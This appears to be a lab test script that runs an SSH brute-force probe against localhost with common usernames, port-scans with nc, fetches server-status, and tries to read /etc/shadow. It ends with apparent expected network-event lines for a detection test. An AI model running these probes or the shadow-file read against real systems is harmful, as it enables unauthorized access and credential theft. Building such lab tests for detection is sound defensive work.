# LIR-006: SSH brute-force probe and banner grab (controlled lab run, v2)
ssh -o BatchMode=yes -o ConnectTimeout=1 -o StrictHostKeyChecking=no admin@127.0.0.1 whoami
ssh -o BatchMode=yes -o ConnectTimeout=1 -o StrictHostKeyChecking=no root@127.0.0.1 whoami
ssh -o BatchMode=yes -o ConnectTimeout=1 -o StrictHostKeyChecking=no user@127.0.0.1 whoami
ssh -o BatchMode=yes -o ConnectTimeout=1 -o StrictHostKeyChecking=no test@127.0.0.1 whoami
ssh -o BatchMode=yes -o ConnectTimeout=1 -o StrictHostKeyChecking=no guest@127.0.0.1 whoami
ssh -o BatchMode=yes -o ConnectTimeout=1 -o StrictHostKeyChecking=no oracle@127.0.0.1 whoami
ssh -o BatchMode=yes -o ConnectTimeout=1 -o StrictHostKeyChecking=no pi@127.0.0.1 whoami
ssh -o BatchMode=yes -o ConnectTimeout=1 -o StrictHostKeyChecking=no ubuntu@127.0.0.1 whoami
nc -zv 127.0.0.1 22
nc -zv 127.0.0.1 80
curl -s http://127.0.0.1:80/server-status
ssh -o BatchMode=yes -o ConnectTimeout=1 -o StrictHostKeyChecking=no admin@127.0.0.1 'cat /etc/shadow'
NET:127.0.0.1:0:127.0.0.1:22:ssh
NET:127.0.0.1:0:127.0.0.1:80:curl
